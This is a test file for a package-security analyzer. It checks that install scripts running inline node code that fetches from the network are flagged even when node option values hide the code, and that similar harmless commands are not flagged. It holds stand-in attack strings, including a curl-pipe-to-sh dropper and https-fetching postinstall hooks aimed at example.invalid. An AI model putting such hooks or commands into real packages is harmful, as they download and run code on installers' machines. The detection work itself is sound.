// Shapes that kept an install script's inline node code out of view though the same code written plainly was read:
// node options whose value is the next word. Payloads are stand-ins.
import { describe, expect, test } from "bun:test";
import { analyze, finalize, isInlineDownload, Meter, metered, type AnalyzeInput, type TarEntry } from "../src/index.ts";

const enc = new TextEncoder();
const file = (path: string, text: string): TarEntry => ({ path, size: enc.encode(text).length, mode: 0o644, data: enc.encode(text) });
const DROPPER = "curl -s https://example.invalid/x.sh | sh";
const NET = `"require('https').get('https://example.invalid/x')"`;

function scoreOf(manifest: Partial<AnalyzeInput["manifest"]>, files: TarEntry[] = []) {
  const m = { name: "probe-pkg", version: "1.0.0", license: "MIT", ...manifest };
  const a = analyze({ name: "probe-pkg", manifest: m, files: [file("package.json", JSON.stringify(m)), ...files], publisher: "a", previousPublishers: [] });
  const r = finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });

  return { score: r.score, ids: r.signals.map((s) => s.id) };
}

describe("node's option values are one word each", () => {
  for (const cmd of [
    `node --conditions dev -e ${NET}`,
    `node -C dev -p ${NET}`,
    `node -r ./x.js -e ${NET}`,
    `node --redirect-warnings file -e ${NET}`,
    `node --conditions 'a b' -e ${NET}`,
    `node --title t --no-warnings --import ./y.mjs --eval ${NET}`,
    `FOO=1 node -C dev -e ${NET}`,
    `echo "$(node -C dev -e ${NET})"`,
  ]) {
    test(`${cmd} runs inline code`, () => {
      expect(isInlineDownload(cmd)).toBe(true);
      expect(scoreOf({ scripts: { postinstall: cmd } }).ids).toContain("install-download");
    });
  }

  for (const cmd of [
    `node -C dev main.js -e ${NET}`,
    `node -C dev --version -e ${NET}`,
    `node -C dev -v -e ${NET}`,
    `node -C dev --v8_options -e ${NET}`,
    `node -C dev --check -e ${NET}`,
    `node -C dev -e ${NET} --version`,
    `node -C dev -e "$(printf x)" --help=true`,
    `node -C dev -- -e ${NET}`,
    `node -C "$X" -e ${NET}`,
    `node --unknown-option dev -e ${NET}`,
    "node --conditions dev -p --version fetch",
    `cat <<'DOC'\nnode --conditions dev -e "console.log('fetch')"\nDOC`,
    "node --conditions dev\u00a0-e ./fetch-demo.js",
    `./node --conditions dev -e ${NET}`,
    "node --title fetch-worker -e '0'",
    "node --title t '-e' '0'; printf '%s\\n' fetch",
    "node --title [ab].js -e 'console.log(\"fetch\")'",
    "node --title ?.js -e 'console.log(\"fetch\")'",
    "node --title t -e 'require(\"https\")' -e '0'",
    "node --conditions dev\u000b-e ./fetch-demo.js 'fetch(1)'",
    "node --title t --conditions --version -p 'fetch(1)' || :",
    "node --conditions dev -e 'console.log(\"fetch\")'",
  ]) {
    test(`${cmd} runs no inline code`, () => {
      expect(isInlineDownload(cmd)).toBe(false);
    });
  }
});


test("the argv reading runs on a meter of its own", () => {
  expect(metered(new Meter(0), () => isInlineDownload(`node -C dev -e ${NET}`))).toBe(true);
});

